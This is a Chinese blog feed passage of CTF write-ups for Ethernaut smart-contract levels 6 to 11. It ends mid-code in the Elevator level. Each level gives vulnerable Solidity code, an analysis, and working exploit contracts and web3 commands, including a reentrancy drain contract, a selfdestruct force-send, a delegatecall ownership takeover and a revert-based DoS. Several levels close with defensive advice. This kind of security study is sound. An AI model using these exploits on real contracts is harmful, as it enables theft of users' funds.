        <content type="html"><![CDATA[<h1 id="Delegation第6关练习"><a href="#Delegation第6关练习" class="headerlink" title="Delegation第6关练习"></a>Delegation第6关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li><p>此级别的目标是让您声明对所给实例的所有权。</p><p> 可能有帮助的事情</p><ul><li>查看 Solidity 关于函数的文档，它是如何工作的，它如何用于将操作委托给链上库，以及它对执行范围有什么影响。<code>delegatecall</code></li><li>fallback方法</li></ul></li></ol><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate {  address public owner;  constructor(address _owner) public {    owner = _owner;  }//构造函数  function pwn() public {    owner = msg.sender;  }//如果能调用这个pwn函数就可以了}contract Delegation {  address public owner;  Delegate delegate;  constructor(address _delegateAddress) public {    delegate = Delegate(_delegateAddress);//把合约给实例化了    owner = msg.sender;  }  fallback() external {    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);    if (result) {      this;    }//fallback函数,其中的delegatecall跟call的区别在于    //前者所调用的函数在本合约中执行的,其他的信息都是自己合约的,相当于把函数拷贝到当前合约来执行  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p><a href="https://paper.seebug.org/633/#0x00">三种调用函数</a></p><p>在 Solidity 中，<code>call</code> 函数簇可以实现跨合约的函数调用功能，其中包括 <code>call</code>、<code>delegatecall</code> 和 <code>callcode</code> 三种方式</p><p>以下是 Solidity 中 <code>call</code> 函数簇的调用模型：</p><pre><code>&lt;address&gt;.call(...) returns (bool)&lt;address&gt;.callcode(...) returns (bool)&lt;address&gt;.delegatecall(...) returns (bool)</code></pre><p>这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。</p><p>在函数调用的过程中， Solidity 中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。</p><h4 id="三种调用方式的异同点"><a href="#三种调用方式的异同点" class="headerlink" title="三种调用方式的异同点"></a><strong>三种调用方式的异同点</strong></h4><ul><li><p>call: 最常用的调用方式，调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，执行环境为<strong>被调用者</strong>的运行环境(合约的 storage)。</p></li><li><p>delegatecall: 调用后内置变量 <code>msg</code> 的值<strong>不会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</p></li><li><p>callcode: 调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</p></li></ul><p>在这里我们看到了两个合约，Delegate初始化时将传入的address设定为合约的owner，下面一个pwn函数也引起我们的注意，从名字也能看出挺关键的。<br>之后下面的Delegation合约则实例化了上面的Delegate合约，其fallback函数使用了delegatecall来调用其中的delegate合约，而这里的delegatecall就是问题的关键所在。<br>我们经常会使用call函数与合约进行交互，对合约发送数据，当然，call是一个较底层的接口，我们经常会把它封装在其他函数里使用，不过性质是差不多的，这里用到的delegatecall跟call主要的不同在于通过delegatecall调用的目标地址的代码要在当前合约的环境中执行，也就是说它的函数执行在被调用合约部分其实只用到了它的代码，所以这个函数主要是方便我们使用存在其他地方的函数，也是模块化代码的一种方法，然而这也很容易遭到破坏。当前上下文中进行执行，但是在 msg.sender 和 msg.value 的指向上却有差异。</p><p>在这里我们要做的就是使用delegatecall调用delegate合约的pwn函数，这里就涉及到使用call指定调用函数的操作，当你给call传入的第一个参数是四个字节时，那么合约就会默认这四个自己就是你要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个bytes，函数前面就是带有括号括起来的参数类型列表的函数名称。</p><p>经过上面的简要分析，问题就变很简单了，sha3我们可以直接通过web3.sha3来调用，而delegatecall在fallback函数里，我们得想办法来触发它，前面已经提到有两种方法来触发，但是这里我们需要让delegatecall使用我们发送的data，所以这里我们直接用封装好的sendTransaction来发送data，其实到了这里我也知道了前面fallback那关我们也可以使用这个方式来触发fallback函数：<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727105611168.png"></p><p>观察题目我们可以发现 Delegation 的 fallback 函数会使用 delegatecall 调用 Delegate 合约，而 Delegate 合约中的 pwn() 函数就是用来修改 owner 的。因此我们只需要向 Delegation 合约发送一笔 msg.data 为 pwn() 函数签名的交易即可：</p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、get net instance，查看玩家地址，合约地址，合约所有者</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727110645894.png"></p><p>2、<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727111424086.png">输入代码发现编译上存在问题修改一下为<code>web.utils.sha3("pwn()");</code></p><p>3、现在再查看owner</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727111833813.png">拿到，提交成功</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727111917175.png"></p><p>这里给大家几个建议：</p><ol><li><code>call</code>、<code>callcode</code>、<code>delegatecall</code>调用的自由度极大，并且 <code>call</code> 会发生 <code>msg</code> 值的改变，需要谨慎的使用这些底层的函数；同时在使用时，需要对调用的合约地址、可调用的函数做严格的限制。</li><li><code>call</code> 与 <code>callcode</code> 调用会改变 <code>msg</code> 的值，会修改 <code>msg.sender</code> 为调用者合约的地址，所以在合约中不能轻易将合约本身的地址作为可信地址。</li><li><code>delegatecall</code> 与 <code>callcode</code> 会拷贝目标代码到自己的环境中执行，所以调用的函数应该做严格的限制，避开调用任意函数的隐患。</li><li>智能合约在部署前必须通过严格的审计和测试。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Force第7关练习</title>
      <link href="//Ethernaut/Ethernaut/7.Ethernaut-Force/"/>
      <url>//Ethernaut/Ethernaut/7.Ethernaut-Force/</url>
      
        <content type="html"><![CDATA[<h1 id="Force第7关练习"><a href="#Force第7关练习" class="headerlink" title="Force第7关练习"></a>Force第7关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ul><li>让合约的balance比0多</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">pragma solidity ^0.4.18;contract Force {/*                   MEOW ?         /\_/\   /    ____/ o o \  /~____  =ø= / (______)__m_m)*/}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>有趣有趣真有趣，一个猫咪的空合约？</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727114115881.png">经过查看资料，发现在以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点，这里确实是比较有趣了。<br>那么接下来就非常简单了，我们只需要创建一个合约并存点eth进去然后调用selfdestruct将合约里的eth发送给我们的目标合约就行了。</p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、拿取目标信息</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727122637276.png"></p><p>2、在remix中插入攻击代码</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.4.20;contract Force { function Force() public payable {} function exploit(address _target) public {    selfdestruct(_target); }}</code></pre><p>这里需要注意版本，1wei，合约地址</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727123054045.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727123116173.png"></p><p>exploit后</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727123220012.png"></p><p>成功</p><p>4、提交胜利</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727123307277.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vault第8关练习</title>
      <link href="//Ethernaut/Ethernaut/8.Ethernaut-Vault/"/>
      <url>//Ethernaut/Ethernaut/8.Ethernaut-Vault/</url>
      
        <content type="html"><![CDATA[<h1 id="Vault第8关练习"><a href="#Vault第8关练习" class="headerlink" title="Vault第8关练习"></a>Vault第8关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ul><li>解锁金库以通过关卡！</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault {  bool public locked;  bytes32 private password;//定义了一个密码  constructor(bytes32 _password) public {    locked = true;//构造函数,locked为true    password = _password;//定义了一个password  }  function unlock(bytes32 _password) public {    if (password == _password) {      locked = false;//如果输入的密码正确就可以解锁    }  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p><a href="https://www.chainnode.com/post/226862">从合约外如何读取私有变量</a></p><p>要求是令 <code>locked = false</code> , 其实就是要我们猜测 <code>password</code> 的值， 这里有个细节不论是 <code>private</code> 变量还是 <code>public</code> 变量都是会存储在区块链上的，就是说依然是公开的。</p><p>这里通过getStorageAt函数来访问它，getStorageAt函数可以让我们访问合约里状态变量的值，它的两个参数里第一个是合约的地址，第二个则是变量位置position，它是按照变量声明的顺序从0开始，顺次加1，不过对于mapping这样的复杂类型，position的值就没那么简单了。至于web3.js有新的学习任务了，参考链接：<br><a href="https://www.qikegu.com/docs/5124">web3.js 教程</a></p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、查看到他的合约地址<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727132831787.png">通过web3.eth.getStorageAt拿到他的password，位置是在[1]</p><p>2、先将他进行Ascii解码，注意这里web3可能会用到<code>web3.utils.hexToAscii</code>或者<code>web.utils.toAscii</code>，通过alert或者console.info 的将他输出出来</p><pre><code class="console">web3.eth.getStorageAt(contract.address, 1,function(x,y){alert(web3.utils.hexToAscii(y))})</code></pre><pre><code class="console">web3.eth.getStorageAt(contract.address, 1,function(x,y){console.info(web3.utils.toAscii(y))})</code></pre><p>3、最后，解锁，查看解锁状态<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727133659321.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727133733106.png"></p><p>4、且慢，还有另一种方式，</p><pre><code>let password = await web3.eth.getStorageAt(instance, 1)contract.unlock(password)</code></pre><p>赋值解锁效率更快</p><p>5、快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727133951943.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>King第9关练习</title>
      <link href="//Ethernaut/Ethernaut/9.Ethernaut-King/"/>
      <url>//Ethernaut/Ethernaut/9.Ethernaut-King/</url>
      
        <content type="html"><![CDATA[<h1 id="King第9关练习"><a href="#King第9关练习" class="headerlink" title="King第9关练习"></a>King第9关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ul><li>给合约转钱，钱比上一个国王多就可以成为新的国王，并且不让别人抢国王的位置，过关条件是成为永久的国王。</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King {  address payable king;  uint public prize;  address payable public owner;  constructor() public payable {    owner = msg.sender;      king = msg.sender;//构造函数,king是创建者    prize = msg.value;//prize是创建者发送的金额  }  fallback() external payable {    require(msg.value &gt;= prize || msg.sender == owner);//要求发送的金额大于等于king的金额或发送者是合约拥有着    king.transfer(msg.value);//把收到的金额转账给目前的king    king = msg.sender;//king变成msg.sender    prize = msg.value;//prize是现在这个king发送的金额数  }  function _king() public view returns (address payable) {    return king;  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>这一题的灵感是来自<a href="https://www.kingoftheether.com/">King of the Ether</a>，官网上有<a href="https://solidity-cn.readthedocs.io/zh/develop/common-patterns.html?highlight=revert#withdrawal-pattern">类似的例子</a></p><p>回到题目，观察合约可以知道，当 King 合约接收到转账的时候，会校验转账金额，通过校验的话，则向当前 King 退款并设置新的 King。我们的任务就是阻止新的 King 的设置，那么使得 King 合约执行到 <code>king.transfer(msg.value)</code> 时 revert 即可。当原智能合约有新的king诞生时会向我们的合约退还之前的奖金，但是攻击合约不接收，直接revert()那么就可以永远占据合约的king不放，简单的说就是谁发送大于 king 的金额就能成为新的 king，但是要先把之前的国王的钱退回去才能更改 king。只要我们一直不接受退回的奖金，那我们就能够一直保持 king 的身份：</p><p><a href="https://solidity-cn.readthedocs.io/zh/develop/types.html#members-of-addresses">可以参考地址类型成员变量</a></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803154259821.png"></p><p>攻击合约如下，不设置 payable 的 fallback 函数或者在 fallback 函数中 revert 都可以。</p><pre><code class="solidity">pragma solidity ^0.4.18;contract attack{    function attack(address _addr) public payable{        _addr.call.gas(10000000).value(msg.value)();    }//先给合约一些钱,使得我们成为king    function () public {        revert();//在 fallback 函数中 revert    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，需要支付1ETH</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803173707465.png"></p><p>2、查看玩家地址，合约地址，国王地址，国王金额prize值（需要进行单位转换）如图，也就是现在国王的金额是1 eth。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803181126445.png"></p><p>3、部署攻击合约，按照箭头方向确认合约。VALUE处输入比1eth大的数就行，这里为了方便输入1001finney，地址填入题目合约地址，进行deploy</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803181243023.png"></p><p>在钱包活动，Etherscan中可以看到新生成的攻击合约地址。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803181333325.png"></p><p>4、查看攻击合约地址，再次查看king地址，就变成了我们攻击合约的地址了（注意要重新赋值prize）：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803181428138.png"></p><p>5、提交实例，检查结果</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210803181507421.png"></p>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Re-Entrancy第10关练习</title>
      <link href="//Ethernaut/Ethernaut/10.Ethernaut-Re-entrancy/"/>
      <url>//Ethernaut/Ethernaut/10.Ethernaut-Re-entrancy/</url>
      
        <content type="html"><![CDATA[<h1 id="Re-entrancy第10关练习"><a href="#Re-entrancy第10关练习" class="headerlink" title="Re-entrancy第10关练习"></a>Re-entrancy第10关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>此级别的目标是让您从合约中窃取所有资金。</p><p> 可能有帮助的事情：</p><ul><li>不受信任的合约可以在您最不期望的地方执行代码。</li><li>回退方法</li><li>抛出/恢复冒泡</li><li>有时，攻击合同的最佳方式是使用另一份合同。</li><li>“超越控制台”部分</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Reentrance {    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable {    balances[_to] = balances[_to].add(msg.value);  }//捐赠  function balanceOf(address _who) public view returns (uint balance) {    return balances[_who];  }//查看余额  function withdraw(uint _amount) public {    if(balances[msg.sender] &gt;= _amount) {//提现金额要大于余额      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");      if(result) {        _amount;      }//提现      balances[msg.sender] -= _amount;    }//但是这里是完成交易之后再从账户里面把提现的金额减去  }  fallback() external payable {}}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>从上面的源代码可以确定这里应该为以太坊里的重入攻击，这也是之前The DAO事件里黑客所用到的攻击。<br>在这里我们重点来看withdraw函数，我们可以看到它接收了一个amount参数，将其与发送者的balance进行比较，不超过发送者的balance就将这些amount发送给sender，同时我们注意到这里它用来发送ether的函数是call.value,发送完成后，它才在下面更新了sender的balances，这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether，同样利用的是我们熟悉的fallback函数来实现。</p><p>当然，这里还有另外一个关键的地方——call.value函数特性，当我们使用call.value()来调用代码时，执行的代码会被赋予账户所有可用的gas,这样就能保证我们的fallback函数能被顺利执行，对应的，如果我们使用transfer和send函数来发送时，代码可用的gas仅有2300而已，这点gas可能仅仅只够捕获一个event，所以也将无法进行可重入攻击，因为send本来就是transfer的底层实现，所以他两性质也差不多。</p><p>因为他是提现完成之后才修改账户余额的，可以使用重入攻击</p><p>另外常用转币方式有三种，题目中用了第三种方法</p><address>.reansfer()发送失败时会通过 throw 回滚状态，只会传递 2300 个 gas 以供调用，从而防止重入<address>.send()发送失败时，返回布尔值 false，只会传递 2300 个 gas  以供调用，从而防止重入<address>.gas().call.value()()当发送失败时，返回布尔值 false 将传递所有可用的 gas 进行调用（可通过 gas(gas _value) 进行限制），不能有效防止重入攻击使用的EXP代码：<pre><code class="solidity">pragma solidity ^0.4.18;contract Reentrance {  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable {    balances[_to] += msg.value;  }//捐赠  function balanceOf(address _who) public view returns (uint balance) {    return balances[_who];  }//查看余额  function withdraw(uint _amount) public {    if(balances[msg.sender] &gt;= _amount) {      if(msg.sender.call.value(_amount)()) {        _amount;      }//提现      balances[msg.sender] -= _amount;    }  }  function() public payable {}}contract Attack {    address instance_address = 0xf9C751E4cc2fCE83242FEb07CD0Dc36cC4CCa01D;    Reentrance target = Reentrance(instance_address);    function Attack() public payable{}    function donate() public payable {        target.donate.value(msg.value)(this);    }//首先,需要捐赠一些钱,满足withdraw的要求    function hack() public {        target.withdraw(0.5 ether);    }//然后调用合约的withdraw函数提现    function get_balance() public view returns(uint) {        return target.balanceOf(this);    }    function my_eth_bal() public view returns(uint) {        return address(this).balance;    }    function ins_eth_bal() public view returns(uint) {        return instance_address.balance;    }    function () public payable {        target.withdraw(0.5 ether);    }//因为我们接受以太币的时候也会调用我们的回退函数     //而我们的回退函数中又一次调用了题目合约的withdraw函数}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，查看合约地址，合约余额</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727160357381.png"></p><p>2、在remix中部署合约，编译之后将合约部署到网络上，此时查看，可以看到</p><ul><li><p>balance 为 0</p></li><li><p>Reentrance 账户余额 1 ether</p></li><li><p>Attack 账户余额 0 ether</p></li></ul><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727173442310.png"></p><p>然后调用donate函数，我们需要在受攻击的合约里给我们的攻击合约地址增加一些balance以完成withdraw第一步的检查：首先在value处填写1 ether；以攻击者合约的身份向题目地址转账 1 ether；</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727173527749.png"></p><ul><li><p>balance 为 1 ether</p></li><li><p>Reentrance 账户余额 2 ether</p></li><li><p>Attack 账户余额 0 ether<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727174011687.png"></p></li></ul><p>3、然后开始攻击，点击hack，成功以后观察：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727174126567.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727174212788.png"></p><p>到这里题目算是完成了，提交就行，但是没太能够理解，那就来复盘几次吧</p><p>攻击的思路依然是在fallback函数上做文章：在账户被修改余额前不断递归调用此函数，造成了银行账户被取光的效果。为了巩固对这个漏洞的理解，我们回头去看第一关，Fallback。</p><hr><p>这里使用另一种方法进行donate，好吧，其实之前语法弄错，自己再来一次</p><p>通过控制台进行donate使用，语法参考web3.js，需要规范一下，不然会报错</p><pre><code class="solidity">contract.donate.sendTransaction('0xf9C751E4cc2fCE83242FEb07CD0Dc36cC4CCa01D',{value: web3.utils.toWei('1', 'ether')})</code></pre><p>之前直接使用这个toWei 报了格式的错误</p><pre><code>contract.donate.sendTransaction("0xeE59e9DC270A52477d414f0613dAfa678Def4b02",{value: toWei(1)})</code></pre><p><a href="http://cw.hubwiz.com/card/c/web3.js-1.0/1/8/24/">“web3.js的单位”</a></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727183305190.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727183439342.png">加到0.5eth再执行上面的hack,观察到余额变为0，快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727183846963.png"></p><h2 id="防御措施："><a href="#防御措施：" class="headerlink" title="防御措施："></a>防御措施：</h2><p>1、在可能的情况下，将ether发送给外部地址时使用solidity内置的transfer()函数，transfer()转账时只发送2300gas，不足以调用另一份合约(即重入发送合约)，使用transfer()重写原合约的withdrawFunds()如下；</p><pre><code class="js">function withdraw(uint _amount) public {    if(balances[msg.sender] &gt;= _amount) {        msg.sender.transfer(_amount);        balances[msg.sender] -= _amount;    }  }</code></pre><!--1.在假定gas成本不变的情况下，推荐transfer（）是有意义的。--><!--2.gas成本并不恒定。智能合同对这个事实应该是健全的。Solidity的transfer（）和send（）使用硬编码的gas量。--><!--3.应该避免这些方法。请改用.call.value（…）（“”）。--><!--4.这就带来了重新进入的风险。请确保使用可用于防止重入漏洞的健壮方法之一。--><!--5.vyper的send（）也有同样的问题。--><p>2、确保状态变量改变发生在ether被发送(或者任何外部调用)之前，即Solidity官方推荐的检查-生效-交互模式(checks-effects-interactions);</p><pre><code class="js">function withdraw(uint _amount) public {    if(balances[msg.sender] &gt;= _amount) {//检查       balances[msg.sender] -= _amount;//生效       msg.sender.transfer(_amount);//交互    } }</code></pre><p>3、使用互斥锁：添加一个在代码执行过程中锁定合约的状态变量，防止重入调用</p><pre><code class="js">bool reEntrancyMutex = false;function withdraw(uint _amount) public {    require(!reEntrancyMutex);    reEntrancyMutex = true;    if(balances[msg.sender] &gt;= _amount) {      if(msg.sender.call.value(_amount)()) {        _amount;      }      balances[msg.sender] -= _amount;      reEntrancyMutex = false;    } }</code></pre><p>重入在这次攻击中发挥了重要作用，最终导致Ethereum Classic(ETC)的分叉，有关The DAO漏洞的详细分析，可参考下面这篇文章：</p><p><a href="https://link.zhihu.com/?target=http://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/">Analysis of the DAO exploithackingdistributed.com</a></p><p>4、OpenZeppelin官方库</p><p><a href="https://link.zhihu.com/?target=https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol">OpenZeppelin/openzeppelin-contractsgithub.com<img src="https://pic2.zhimg.com/v2-216324b4f941cf09cf1dfcb65d287dad_180x120.jpg"></a></p><pre><code class="js">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;/** * @dev Contract module that helps prevent reentrant calls to a function. * * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier * available, which can be applied to functions to make sure there are no nested * (reentrant) calls to them. * * Note that because there is a single `nonReentrant` guard, functions marked as * `nonReentrant` may not call one another. This can be worked around by making * those functions `private`, and then adding `external` `nonReentrant` entry * points to them. * * TIP: If you would like to learn more about reentrancy and alternative ways * to protect against it, check out our blog post * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul]. */abstract contract ReentrancyGuard {    // Booleans are more expensive than uint256 or any type that takes up a full    // word because each write operation emits an extra SLOAD to first read the    // slot's contents, replace the bits taken up by the boolean, and then write    // back. This is the compiler's defense against contract upgrades and    // pointer aliasing, and it cannot be disabled.    // The values being non-zero value makes deployment a bit more expensive,    // but in exchange the refund on every call to nonReentrant will be lower in    // amount. Since refunds are capped to a percentage of the total    // transaction's gas, it is best to keep them low in cases like this one, to    // increase the likelihood of the full refund coming into effect.    uint256 private constant _NOT_ENTERED = 1;    uint256 private constant _ENTERED = 2;    uint256 private _status;    constructor () {        _status = _NOT_ENTERED;    }    /**     * @dev Prevents a contract from calling itself, directly or indirectly.     * Calling a `nonReentrant` function from another `nonReentrant`     * function is not supported. It is possible to prevent this from happening     * by making the `nonReentrant` function external, and make it call a     * `private` function that does the actual work.     */    modifier nonReentrant() {        // On the first call to nonReentrant, _notEntered will be true        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");        // Any calls to nonReentrant after this point will fail        _status = _ENTERED;        _;        // By storing the original value once again, a refund is triggered (see        // https://eips.ethereum.org/EIPS/eip-2200)        _status = _NOT_ENTERED;    }}</code></pre></address></address></address>]]></content>
      
      
      <categories>
          
          <category> Ethernaut </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elevator第11关练习</title>
      <link href="//Ethernaut/Ethernaut/11.Ethernaut-Elevator/"/>
      <url>//Ethernaut/Ethernaut/11.Ethernaut-Elevator/</url>
      
        <content type="html"><![CDATA[<h1 id="Elevator第11关练习"><a href="#Elevator第11关练习" class="headerlink" title="Elevator第11关练习"></a>Elevator第11关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>这台电梯不会让您到达建筑物的顶部。对吗？</p><ul><li><p>有时候，固执并不擅长守承诺。</p></li><li><p>这期望从.<code>Elevator``Building</code></p></li></ul><p>目标：成为 top，让变量 top 变为 true</p><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;interface Building {  function isLastFloor(uint) external returns (bool);}//定义了一个接口,这个函数返回你是不是在最顶层contract Elevator {  bool public top;//布尔型变量,是否是top,默认false  uint public floor;//楼层  function goTo(uint _floor) public {    Building building = Building(msg.sender);//如果不是最顶层的话就进入if    if (! building.isLastFloor(_floor)) {      floor = _floor;//拿到你的_floor      top = building.isLastFloor(floor);//让top等于判断结果,所以还是false    }//但是如果你是top的话,没有改top的机会,所以还是false  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>在合约的开头处有一个Building接口，定义了isLastFloor函数，返回值是bool，应该是用来返回这一楼层是否为最顶层，在接口里没有函数是已实现的，类似于抽象合约，可以理解为它仅仅用来提供一个标准，这样继承于它的合约就可以遵照它的标准来进行交互，而接口内的函数在其调用合约内定义即可。</p><p>之后在下面的主合约里，定义了一个bool型的top变量，在goto函数里对传入的_floor变量进行了判断，从逻辑上我们发现判断的条件里如果isLastFloor返回false，通过if后再将isLastFloor的返回值赋给top，这样的话我们的top还是个false，而这里我们要想让top的值变为true，那么我们得想个办法在isLastFloor上动动手脚，由于goTo函数调用了两次isLastFloor，因此我们可以将该函数构造为取反函数即可：</p><pre><code>pragma solidity ^0.4.18;interface Building {  function isLastFloor(uint) external returns (bool);}//定义了一个接口,这个函数返回你是不是在最顶层contract Elevator {  bool public top;//布尔型变量,是否是top,默认false  uint public floor;//楼层  function goTo(uint _floor) public {    Building building = Building(msg.sender);    if (! building.isLastFloor(_floor)) {//如果不是最顶层的话就进入if      floor = _floor;//拿到你的_floor      top = building.isLastFloor(floor);//让top等于判断结果,所以还是false    }//但是如果你是top的话,没有改top的机会,所以还是false  }}contract BuildingEXP{    Elevator ele;    bool t = true;//一开始定义为true    function isLastFloor(uint) view public returns (bool) {        t = !t;//在if那个地方要为false进入         